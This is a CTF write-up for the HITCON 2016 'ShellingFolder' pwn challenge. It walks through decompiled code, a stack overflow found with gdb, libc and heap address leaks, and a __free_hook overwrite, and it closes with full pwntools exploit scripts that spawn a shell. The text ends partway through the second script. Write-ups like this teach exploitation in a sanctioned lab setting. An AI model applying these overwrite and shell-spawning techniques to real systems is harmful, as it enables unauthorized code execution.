---
title: "Pwn-ShellingFolder(200) - Solved by 39 Teams"
sidebar_position: 1
---


## **Information**

### **Description**
```
This is a magic folder.  
nc 52.69.237.212 4869

[shellingfolder](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/shellingfolder_42848afa70a13434679fac53a471239255753260)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_375198810bb39e6593a968fcbcf6556789026743)
```
### **Files**

* [shellingfolder\_42848afa70a13434679fac53a471239255753260](/attachments/7536652/7537075.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536652/7537074.bin)

### **Source Code**

## **Write up**

### File information

```sh title="File information"
autolycos@ubuntu:~/CTF/HITCON2016/shellingfolder$ file shellingfolder_42848afa70a13434679fac53a471239255753260 
shellingfolder_42848afa70a13434679fac53a471239255753260: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=011a2a4e3b9edc0ee9b08578c62ca76dec45ef64, stripped
autolycos@ubuntu:~/CTF/HITCON2016/shellingfolder$ checksec.sh --file shellingfolder_42848afa70a13434679fac53a471239255753260 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   shellingfolder_42848afa70a13434679fac53a471239255753260
autolycos@ubuntu:~/CTF/HITCON2016/shellingfolder$
```

### Binary analysis

* **When you run this problem, the following menu is displayed.**
  + 1.List the current folder.
  + 2.Change current folder
  + 3.Create a folder
  + 4.Create a file in the current folder
  + 5.Remove the folder or file.
  + 6. Calculate folder size
  + 7.End

```sh title="Menu"
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:
```

#### **Main**

* **The main() function function of the problem is as follows.**  
  + Print the Menu list using the PrintMenu() function.
  + The InputNumber() function is used to receive the menu number to be used from the user.
* **Before displaying the menu, create “rootFolder” using the structure below.**

```c title="FileInfo struct"
struct FileInfo{
	struct FileInfo *list[10];
	struct FileInfo *parentFolder;
	char docName[32];
	long size;
	int fileType;
}
```

```c title="main function"
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  unsigned int savedregs; // [rsp+10h] [rbp+0h]

  setSIGALM();
  v3 = (__int64)calloc(1uLL, 0x88uLL);
  rootFolder = (struct FileInfo *)v3;
  v3 += 88LL;
  *(_DWORD *)v3 = 'toor';
  *(_BYTE *)(v3 + 4) = 0;
  rootFolder->parentFolder = rootFolder;
  rootFolder->fileType = 1;
  gFolder = rootFolder;
  while ( 1 )
  {
    PrintMenu();
    InputNumber();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        ListFloder(gFolder);
        break;
      case 2u:
        ChangeFolder(gFolder);
        break;
      case 3u:
        MakeFolder(gFolder);
        break;
      case 4u:
        CreateFile(gFolder);
        break;
      case 5u:
        Remove(gFolder);
        break;
      case 6u:
        Caculate(gFolder);
        break;
      case 7u:
        puts("bye bye");
        exit(0);
        return;
      default:
        puts("Invalid choice");
        break;
    }
  }
}
```

#### **List the current folder**

* **The function has the following functions.**
  + Prints the folder name and file name stored in the list[] of the "gFolder" global variable.

```c title="ListFloder function"
unsigned __int64 __fastcall ListFloder(FileInfo *folder)
{
  signed int i; // [rsp+18h] [rbp-38h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( !folder )
    exit(1);
  puts("----------------------");
  for ( i = 0; i <= 9; ++i )
  {
    if ( folder->list[i] )
    {
      if ( folder->list[i]->fileType )
        printf("\x1B[32m%s\x1B[0m\n", folder->list[i]->docName);
      else
        puts(folder->list[i]->docName);
    }
  }
  puts("----------------------");
  return __readfsqword(0x28u) ^ v3;
}
```

#### **Change the current folder**

* **The function has the following functions.**
  + Using the following method, the function changes the address value pointed to by the "gFolder" global variable.
  + The user inputs the name of the folder he or she is looking for.
    - If the input value is equal to "..", the address of the parentFolder of the "gFolder" global variable is stored in the "gFolder" global variable.
    - If the input value is not equal to "..", search for the name of the folder stored in the list[] variable of the "gFolder" global variable.
      * If there is a folder with the same name as the input value, the address of the folder (list[i]) is stored in the "gFolder" global variable.
      * If there is no folder with the same name as the input value, the phrase “No such Folder” is output.

```c title="ChangeFolder function"
signed __int64 __fastcall ChangeFolder(FileInfo *folder)
{
  signed int i; // [rsp+1Ch] [rbp-34h]
  char folderName[40]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( !folder )
    exit(-1);
  printf("Choose a Folder :");
  InputName(folderName, 31);
  if ( !strcmp(folderName, "..") )
  {
    gFolder = folder->parentFolder;
    puts("successful");
  }
  else
  {
    for ( i = 0; i <= 9; ++i )
    {
      if ( folder->list[i] && folder->list[i]->fileType == 1 && !strcmp(folder->list[i]->docName, folderName) )
      {
        gFolder = folder->list[i];
        puts("successful");
        return 1LL;
      }
    }
    puts("No such Folder");
  }
  return 0LL;
}
```

#### **Make a folder**

* **The function has the following functions.**
  + Create space for the FileInfo structure using the calloc() function.
    - The name of the folder is input from the user using the InputName() function.
    - Proceed with the following basic settings:
      * newFolder→fileType = 1(folder)
      * newFolder→parentFolder = folder (address stored in global variable)
      * newFolder→size = 0
  + Use the checkEmptyList() function to check whether there is space to store the newly created folder information in the list[] of the global variable.

```c title="MakeFolder function"
int __fastcall MakeFolder(struct FileInfo *folder)
{
  int result; // eax
  FileInfo *newFolder; // [rsp+18h] [rbp-8h]

  if ( !folder )
    exit(1);
  newFolder = (FileInfo *)calloc(1uLL, 0x88uLL);
  if ( !newFolder )
  {
    puts("Malloc error!!");
    exit(-1);
  }
  printf("Name of Folder:", 136LL);
  InputName((unsigned __int8 *)newFolder->docName, 31);
  newFolder->fileType = 1;
  newFolder->parentFolder = folder;
  newFolder->size = 0LL;
  if ( (unsigned int)checkEmptyList(folder, newFolder) == 1 )
    result = puts("successful");
  else
    result = puts("Failed");
  return result;
}
```

#### **Create a file in current folder**

* **The function has the following functions.**
  + The functionality of that function is the same as that of the MakeFolder() function, except for some.
  + The functions and differences of the MakeFolder() function are as follows.  
    - newFile→fileType = 0(file)
    - newFile→size = numeric value entered by the user

```c title="CreateFile function"
int __fastcall CreateFile(FileInfo *folder)
{
  int result; // eax
  FileInfo *newFile; // [rsp+18h] [rbp-8h]

  if ( !folder )
    exit(1);
  newFile = (FileInfo *)calloc(1uLL, 0x88uLL);
  if ( !newFile )
  {
    puts("Malloc error!!");
    exit(-1);
  }
  printf("Name of File:", 136LL);
  InputName((unsigned __int8 *)newFile->docName, 31);
  newFile->fileType = 0;
  newFile->parentFolder = folder;
  printf("Size of File:", 31LL);
  newFile->size = InputNumber();
  if ( (unsigned int)checkEmptyList((__int64)folder, (__int64)newFile) == 1 )
    result = puts("successful");
  else
    result = puts("Failed");
  return result;
}
```

#### **Remove a folder or a file**

* **The function has the following functions.**
  + The user inputs the name of the folder or file to be deleted.
  + The input value is compared with the docName stored in list[] of the “gFolder” global variable.  
    - If there are identical names, call the FreeFolder() function.
    - Removes previously stored information by storing 0 in the list[].

```c title="Remove function"
signed __int64 __fastcall Remove(FileInfo *folder)
{
  signed int i; // [rsp+1Ch] [rbp-34h]
  char fileName[40]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( !folder )
    exit(-1);
  printf("Choose a Folder or file :");
  InputName(fileName, 31);
  for ( i = 0; i <= 9; ++i )
  {
    if ( folder->list[i] && !strcmp(folder->list[i]->docName, fileName) )
    {
      FreeFolder(folder->list[i], fileName);
      folder->list[i] = 0LL;
      return 1LL;
    }
  }
  puts("No such Folder");
  return 0LL;
}
```

#### **FreeFolder**

* **The function has the following functions.**
  + Receive information about the folder and file to be deleted and check the type.
    - If the object to be deleted is a folder, the files and folders existing under the folder are deleted using the FreeFolder() function.
      * After organizing the lower-level files, use the free() function to release the area where the information in the folder was stored.
    - If the object to be deleted is a file, use the free() function to free the used space.

```c title="FreeFolder function"
void __fastcall FreeFolder(FileInfo *delFolder, char *fileName)
{
  signed int i; // [rsp+1Ch] [rbp-4h]

  if ( delFolder )
  {
    if ( delFolder->fileType )
    {
      for ( i = 0; i <= 9; ++i )
      {
        if ( delFolder->list[i] )
          FreeFolder(delFolder->list[i], fileName);
      }
      free(delFolder);
    }
    else
    {
      free(delFolder);
    }
  }
}
```

#### **Calculate the size of folder**

* **The function has the following functions.**
  + Initialize the area of ​​the “isDocName” variable to 0.
  + Store the size address value of the "gFolder" global variable in the ptrSize pointer variable. (ptrSize = &folder->size;)
  + Use the callMemcopy() function to copy the contents of folder→list[count]→docName to the isDocName variable.
  + Check the type information stored in the list[] of the “gFolder” global variable.
    - If the type is folder (1), the \*ptrSize value is stored in the \*ptrSize variable.
    - If the type is folder (0), add the size value of the file to the \*ptrSize variable.
  + The vulnerability occurs when the callMemcopy() function is called in the function. (Stack overflow)
    - The size of the "isDocName" variable is 24 bytes.
    - The size of the "folder→list[count]→docName" variable is 32 bytes.
    - In other words, you can overwrite the stack area (\*ptrSize) using “folder→list[count]→docName”.
  + And since the "isDocName" variable is used when printing the name of the file, the Heap address stored in \*ptrSize can be extracted.

```c title="Caculate function"
unsigned __int64 __fastcall Caculate(FileInfo *folder)
{
  char isDocName[24]; // [rsp+10h] [rbp-30h]
  __int64 *ptrSize; // [rsp+28h] [rbp-18h]
  int count; // [rsp+30h] [rbp-10h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( !folder )
    exit(1);
  count = 0;
  memset(isDocName, 0, 32uLL);
  while ( count <= 9 )
  {
    if ( folder->list[count] )
    {
      ptrSize = &folder->size;
      callMemcopy(isDocName, folder->list[count]->docName);
      if ( folder->list[count]->fileType == 1 )
      {
        *ptrSize = *ptrSize;
      }
      else
      {
        printf("%s : size %ld\n", isDocName, folder->list[count]->size);
        *ptrSize += folder->list[count]->size;
      }
    }
    ++count;
  }
  printf("The size of the folder is %ld\n", folder->size);
  return __readfsqword(0x28u) ^ v5;
}
```

#### **callMemcopy**

* **The function has the following functions.**  
  + Extract the size of the string stored in the heap variable.
  + Use the memcpy() function to store the string stored in the heap variable in the stack variable.

```c title="callMemcopy function"
void *__fastcall callMemcopy(void *stack, const char *heap)
{
  size_t len; // ST28_8

  len = strlen(heap);
  return memcpy(stack, heap, len);
}
```

### Debugging

* **Set the following break point.**
  + Caculate() → call memset : Base addresss + 0x1378
  + callMemcopy() → call memcpy : Base addresss + 0x1331

```sh title="Break point"
lazenca0x0@ubuntu:~/CTF/HITCON/ShellingFolder$ gdb -q ./shell*
Reading symbols from ./shellingfolder_42848afa70a13434679fac53a471239255753260...(no debugging symbols found)...done.
gdb-peda$ handle SIGALRM nopass
Signal        Stop	Print	Pass to program	Description
SIGALRM       No	Yes	No		Alarm clock
gdb-peda$ b *0x555555554000 + 0x1378
Breakpoint 1 at 0x555555555378
gdb-peda$ b *0x555555554000 + 0x13A5
Breakpoint 2 at 0x555555555378
gdb-peda$ b *0x555555554000 + 0x1331
Breakpoint 3 at 0x555555555331
gdb-peda$
```

* **Enter the following to check for overflow.**
  + After calling the “4.Create a file in current folder” function, enter “A \* 24 + B \* 7” as the value for “Name of File:”.
  + Call the “Calculate the size of folder” function.
* **You can check the change in the “isDocName[24]” variable as follows.**
  + The "isDocName[24]" area is initialized to 0 by the memset() function.
  + The address value of “&folder→size” (0x555555757088) is stored in the “ptrSize” (0x7fffffffe138) area.

```sh title="Overflow confirmation"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/ShellingFolder/shellingfolder_42848afa70a13434679fac53a471239255753260 
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:4
Name of File:AAAAAAAAAAAAAAAAAAAAAAAABBBBBBB
Size of File:successful
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:6
Breakpoint 1, 0x0000555555555378 in ?? ()
gdb-peda$ i r rdi
rdi            0x7fffffffe120	0x7fffffffe120
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000555555555820	0x00000006f7a7c7fa
0x7fffffffe130:	0x0000000000000a36	0x00007fffffffe150
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$ ni
0x000055555555537d in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000000000000000	0x0000000000000000
0x7fffffffe130:	0x0000000000000000	0x0000000000000000
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$ c
Continuing.
Breakpoint 2, 0x00005555555553a5 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000000000000000	0x0000000000000000
0x7fffffffe130:	0x0000000000000000	0x0000555555757088
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$
```

* **You can check Stack Overflow as follows.**
  + The "ptrSize" (0x7fffffffe138) area was overwritten with the user input value by memcpy() of the callMemcopy() function.
    - 0x555555757088 → 0x0042424242424242
  + In other words, an attacker can use the vulnerability to change the value of ptrSize at will.

```sh title="Stack overflow confirmation"
gdb-peda$ c
Continuing.

Breakpoint 3, 0x0000555555555331 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x4141414141414141	0x4141414141414141
0x7fffffffe130:	0x4141414141414141	0x0042424242424242
0x7fffffffe140:	0x0000555500000000	0x06a271d09477ed00
gdb-peda$
```

### Structure of Exploit code

* The order of payload is as follows:

:::note[Payload order]
1. Leak Libc Base
2. Leak Heap Addresss
3. offset extraction
4. Overflow
5. Run Shell
:::

* This is explained in more detail as follows.

:::note[Detailed description]
1. LeakLibcBase
   1. "Remove a folder or a file"
   2. "Create a file in current folder"
   3. "List the current folder"
2. Leak Heap Addresss
3. offset extraction
   1. System()
   2. "/bin/sh" execve()
4. Overflow
   1. Find the overflow target (\_\_free\_hook)
   2. Overflow in target area
5. Run Shell
:::

* The information you need to find out for an attack based on the payload is as follows.

:::note[List of information to check]

* Leak libc addresss
* system offset
* Overflow target
:::

### Information for attack

#### Leak Libc addresss

* **You can extract Libc addresses in the following way.**
  + First, create two folders and one file.  
    - Create Libc addresses in the Heap area using two folders.
    - Use the file to change the value stored in list[1] of “rootFolder”.

```sh title="Default Settings"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/ShellingFolder/shellingfolder_42848afa70a13434679fac53a471239255753260
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:3
Breakpoint 2, 0x000055555555501f in ?? ()
gdb-peda$ i r rax
rax            0x5555557570a0   0x5555557570a0
gdb-peda$ c
Continuing.
Name of Folder:AAAA
successful
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:3
Breakpoint 2, 0x000055555555501f in ?? ()
gdb-peda$ i r rax
rax            0x555555757130   0x555555757130
gdb-peda$ c
Continuing.
Name of Folder:BBBB
successful
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:4
Name of File:CCCCCCCCCCCCCCCCCCCCCCCCD
Size of File:64
successful
**************************************
            ShellingFolder           
**************************************
 1.List the current folder           
 2.Change the current folder         
 3.Make a folder                     
 4.Create a file in current folder   
 5.Remove a folder or a file         
 6.Caculate the size of folder       
 7.Exit                              
**************************************
Your choice:
```

* **Libc addresses are created in the heap area by deleting the folder as follows.**
  + The generated Libc addresses are the top address of main\_arena.
  + As the area was registered in the unsorted bin, values ​​were created in the fd and bk areas.
  + In order to output the bk area, the value of "rootFolder" → list[1] must be changed.
    - The address that should be saved in "rootFolder"→list[1] is 0x5555557570e0.
      * bk(0x555555757138) - 0x58 = 0x5555557570e0
    - You must add 0x40(64) from the value stored in "rootFolder"→list[1].
      * 0x5555557570e0 - Value stored in "rootFolder"→list[1] (0x00005555557570a0) = 0x40(64)

```sh title="Create Libc addresss"
Your choice:5
Choose a Folder or file :BBBB
Breakpoint 1, 0x0000555555554e11 in ?? ()
gdb-peda$ x/12gx 0x555555757130
0x555555757130:	0x0000000000000000	0x0000000000000000
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000555555757010	0x0000000042424242
gdb-peda$ ni
0x0000555555554e16 in ?? ()
gdb-peda$ x/12gx 0x555555757130
0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000555555757010	0x0000000042424242
gdb-peda$ x/gx 0x555555757010 
0x555555757010:	0x00005555557570a0
gdb-peda$ x/gx 0x00005555557570a0 + 0x58
0x5555557570f8:	0x0000000041414141
gdb-peda$ x/20gx 0x00005555557570a0
0x5555557570a0:	0x0000000000000000	0x0000000000000000
0x5555557570b0:	0x0000000000000000	0x0000000000000000
0x5555557570c0:	0x0000000000000000	0x0000000000000000
0x5555557570d0:	0x0000000000000000	0x0000000000000000
0x5555557570e0:	0x0000000000000000	0x0000000000000000
0x5555557570f0:	0x0000555555757010	0x0000000041414141
0x555555757100:	0x0000000000000000	0x0000000000000000
0x555555757110:	0x0000000000000000	0x0000000000000000
0x555555757120:	0x0000000000000001	0x0000000000000091
0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
gdb-peda$ p/x 0x555555757138 - 0x58
$3 = 0x5555557570e0
gdb-peda$ p/x 0x5555557570e0 - 0x5555557570a0
$4 = 0x40
gdb-peda$ p/d 0x40
$5 = 64
```

* **You can change the value of the "rootFolder" variable in the following ways.**
  + The address value stored in "ptrSize" was changed by 1 byte due to the file name entered by the user.
  + That is, you can change its value to the address value of "rootFolder".
    - Pass 0x10 instead of 'D'
    - Ex) "C" \* 24 + 0x10 : 0x0000555555757088 → 0x0000555555757044

```sh title="Stack Overflow"
gdb-peda$ c
Continuing.
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:6
Breakpoint 3, 0x0000555555555331 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x0000000041414141	0x0000000000000000
0x7fffffffe130:	0x0000000000000000	0x0000555555757088
0x7fffffffe140:	0x0000555500000000	0x6ad1e428fbe39100
gdb-peda$ c
Continuing.
Breakpoint 3, 0x0000555555555331 in ?? ()
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x4343434343434343	0x4343434343434343
0x7fffffffe130:	0x4343434343434343	0x0000555555757044
0x7fffffffe140:	0x0000555500000002	0x6ad1e428fbe39100
gdb-peda$ set *0x7fffffffe138 = 0x55757010
gdb-peda$ x/6gx 0x7fffffffe120
0x7fffffffe120:	0x4343434343434343	0x4343434343434343
0x7fffffffe130:	0x4343434343434343	0x0000555555757010
0x7fffffffe140:	0x0000555500000002	0x6ad1e428fbe39100
gdb-peda$ x/4gx 0x0000555555757010
0x555555757010:	0x00005555557570a0	0x0000000000000000
0x555555757020:	0x00005555557571c0	0x0000000000000000
gdb-peda$
```

* **You can change the value stored in list[1] of “rootFolder” by the size value of the file as follows.**
  + Due to Stack Overflow, the address of ptrSize became "rootFolder" → list[1]. (0x555555757010)
  + The size (0x40) value of the file is added to "rootFolder" → list[1].
    - 0x555555757010: 0x00005555557570a0 +x040 = 0x5555557570e0
  + The name of the folder to be output is the bk area of ​​the free chunk (0x5555557570e0 + 0x58).

```sh title="Change the value of "rootFolder→list1""
Breakpoint 4, 0x000055555555543e in ?? ()
gdb-peda$ i r rax
rax            0x555555757010	0x555555757010
gdb-peda$ i r rdx
rdx            0x5555557570e0	0x5555557570e0
gdb-peda$ x/gx 0x5555557570e0 + 0x58
0x555555757138:	0x00007ffff7dd1b78
gdb-peda$
```

* **You can check Libc addresses as follows.**
  + Libc addresss : x??(0x7ffff7dd1b78)

```sh title="Leak libc address"
gdb-peda$ c
Continuing.
The size of the folder is 0
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:1
----------------------
x??
CCCCCCCCCCCCCCCCCCCCCCCCD
----------------------
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:
```

* **The information confirmed above can be implemented with the following code.**

```python title="Leak libc address"
from pwn import *

PWN_FILE = "./shellingfolder_42848afa70a13434679fac53a471239255753260"

def Functions(number,name,size):
	p.sendlineafter(":",str(number))
	if (number != 1 or number != 6):
		p.sendlineafter(":",name)
	if number == 4:
		p.sendlineafter(":",str(size))
	
p = process(PWN_FILE)	

Functions(3,"AAAA",0)
Functions(3,"BBBB",0)
Functions(4,"C"*24+p8(0x10),64)
Functions(5,"BBBB",0)
Functions(6,"",0)
Functions(1,"",0)

p.recvuntil("----------------------\n")
libcAddr = u64(p.recv(6).ljust(8,"\x00"))
log.info("Libc Addresss : " + hex(libcAddr))
```

```sh title="Leak libc address"
autolycos@ubuntu:~/CTF/HITCON2016/Shellingfolder$ python Exploit.py 
[+] Starting local process './shellingfolder_42848afa70a13434679fac53a471239255753260': Done
[*] Libc Addresss : 0x7f108925f7b8
[*] Stopped program './shellingfolder_42848afa70a13434679fac53a471239255753260'
```

#### **Leak Heap Addresss**

* **Heap Addresses can be extracted simply in the following way.**
  + In the “Create a file in current folder” function, enter only 24 characters as the file name.
  + When the "Caculate the size of folder" function is called and the file name is output, the Heap Addresses stored in \*ptrSize are also output.
  + The reason this phenomenon occurs is because there is no space between the "isDocName" variable and "\*ptrSize" to output the file name, so it is recognized as a single sentence.

```sh title="Leak Heap address"
Starting program: /home/autolycos/CTF/HITCON2016/Shellingfolder/shellingfolder_42848afa70a13434679fac53a471239255753260 
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:4
Name of File:AAAAAAAAAAAAAAAAAAAAAAAA
Size of File:0
successful
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:6

Breakpoint 1, 0x000055555555540a in ?? ()
(gdb) i r rax
rax            0x7fffffffe1b0	140737488347568
(gdb) x/4gx 0x7fffffffe1b0
0x7fffffffe1b0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1c0:	0x4141414141414141	0x0000555555757088
(gdb)
```

* You can extract it using the following script.

```python title="Leak Heap address"
...
Functions(4,"Z"*24,0)	#Create File
Functions(6,"",0)		#Calc
p.recvuntil("Z"*24)
heapAddr = u64(p.recv(6).ljust(8,"\x00"))
Functions(5,"Z"*24,0)
...
```

#### **Find target to overwrite**

* **In this problem, you can easily change the code flow by using the following areas.**
  + \_\_malloc\_hook
  + \_\_realloc\_hook
  + \_\_free\_hook
* **Here we use the "\_\_free\_hook" area.**

:::note[Memory Allocation Hooks]
* The GNU C library allows you to change the behavior of malloc, realloc and free by specifying appropriate hook functions. 
  + These hooks help debug programs that use dynamic storage allocation, for example.
  + Hook variables are declared in 'malloc.h'.

|  |  |  |
| --- | --- | --- |
| **\_\_\_\_malloc\_\_hook** | The value of this variable is a pointer to a function that malloc uses every time it is called. You can define this function to look like malloc. | void \*function (size\_t size, const void \*caller) |
| **\_\_\_realloc\_\_hook** | The value of this variable is a pointer to a function that realloc uses whenever it is called. You can define this function to look like realloc. | void \*function (void \*ptr, size\_t size, const void \*caller) |
| **\_\_\_\_free\_\_hook** | The value of this variable is a pointer to a function that is used whenever free is called. You can define this function to look like free. | void function (void \*ptr, const void \*caller) |
:::

#### **Offset(execve("/bin/sh"))**

* **There is another way other than passing "sh" to the system() function.**
  + This uses code that calls execve(/"bin/sh") within the system() function.

```c title="glibc-2.24/sysdeps/posix/system.c"
#define	SHELL_PATH	"/bin/sh"	/* Path of the shell.  */
#define	SHELL_NAME	"sh"		/* Name to give it.  */

...

if (pid == (pid_t) 0)
{
      /* Child side.  */
      const char *new_argv[4];
      new_argv[0] = SHELL_NAME;
      new_argv[1] = "-c";
      new_argv[2] = line;
      new_argv[3] = NULL;

      /* Restore the signals.  */
      (void) __sigaction (SIGINT, &intr, (struct sigaction *) NULL);
      (void) __sigaction (SIGQUIT, &quit, (struct sigaction *) NULL);
      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);
      INIT_LOCK ();

      /* Exec the shell.  */
      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
      _exit (127);
}
...
```

* The offset of the code is 0x4647c.

```sh title="IDA Pro Disassembly" 
.text:000000000004647C                 mov     rax, cs:environ_ptr_0
.text:0000000000046483                 lea     rdi, aBinSh     ; "/bin/sh"
.text:000000000004648A                 lea     rsi, [rsp+188h+var_158]
.text:000000000004648F                 mov     cs:dword_3C06C0, 0
.text:0000000000046499                 mov     cs:dword_3C06D0, 0
.text:00000000000464A3                 mov     rdx, [rax]
.text:00000000000464A6                 call    execve
```

## **Exploit Code**

### **system("sh;")**

```python title="Write a exploit code 1" 
from pwn import *
#context.log_level = 'debug'

PWN_FILE = "./shellingfolder_42848afa70a13434679fac53a471239255753260"
LIBC_FILE = "/lib/x86_64-linux-gnu/libc.so.6"

def List():
	p.recvuntil('Your choice:')
	p.sendline('1')

def CreateDir(name):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Name of Folder:')
	p.sendline(name)	

def CreateFile(name,size):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Name of File:')
	p.send(name)
	p.recvuntil('Size of File:')
	p.sendline(str(size))

def Calc():
	p.recvuntil('Your choice:')
	p.sendline('6')

def Remove(name):
	p.recvuntil('Your choice:')
	p.sendline('5')
	p.recvuntil('Choose a Folder or file :')
	p.sendline(name)
	
p = process(PWN_FILE)	
libc = ELF(LIBC_FILE)

#Leak Heap addresss
CreateFile("Z"*24,0)
Calc()
p.recvuntil("Z"*24)
heapAddr = u64(p.recv(6).ljust(8,"\x00"))
Remove("Z"*24)

#Leak Libc addresss
CreateDir("AAAA")
CreateDir("BBBB")
CreateFile("C"*24+p8(0x10),64)
Remove("BBBB")		
Calc()
List()

#Print Libc addresss
p.recvuntil("----------------------\n")
libcAddr = u64(p.recv(6).ljust(8,"\x00"))
libc.addresss += libcAddr - 0x3c4b78
systemAddr = libc.symbols['system']
freeHook = libc.symbols['__free_hook']

log.info("Heap Addresss : " + hex(heapAddr))
log.info("Libc Addresss : " + hex(libcAddr))
log.info("System() : " + hex(systemAddr))
log.info("__free_hook() : " + hex(freeHook))

#Overflow freeHook -> systemAddr
CreateFile("D"*24+p64(freeHook)[:7], (systemAddr & 0xffffffff))
CreateFile("E"*24+p64(freeHook+4)[:7], (systemAddr & 0xffffffff00000000)>>32)

#Overflow "GetSh->list[1]" -> "sh;"
CreateFile("F"*24+p64(heapAddr+0x2e8)[:7:],0x3b6873)
CreateFile("GetSh",0)	
Calc()

#system(sh;)
Remove("GetSh")

p.interactive()
```

### Using execve("/bin/sh") in system() function

```python title="Write a exploit code 2"
from pwn import *
#context.log_level = 'debug'

PWN_FILE = "./shellingfolder_42848afa70a13434679fac53a471239255753260"
LIBC_FILE = "/lib/x86_64-linux-gnu/libc.so.6"

def List():
	p.recvuntil('Your choice:')
	p.sendline('1')

def CreateDir(name):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Name of Folder:')
	p.sendline(name)	

def CreateFile(name,size):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Name of File:')
	p.send(name)
	p.recvuntil('Size of File:')
	p.sendline(str(size))

def Calc():
	p.recvuntil('Your choice:')
	p.sendline('6')

def Remove(name):
	p.recvuntil('Your choice:')
	p.sendline('5')
	p.recvuntil('Choose a Folder or file :')
	p.sendline(name)
	
p = process(PWN_FILE)	
libc = ELF(LIBC_FILE)

#Leak Heap addresss
CreateFile("Z"*24,0)	#Create File
Calc()
p.recvuntil("Z"*24)
heapAddr = u64(p.recv(6).ljust(8,"\x00"))
Remove("Z"*24)

#Leak Libc addresss
CreateDir("AAAA")
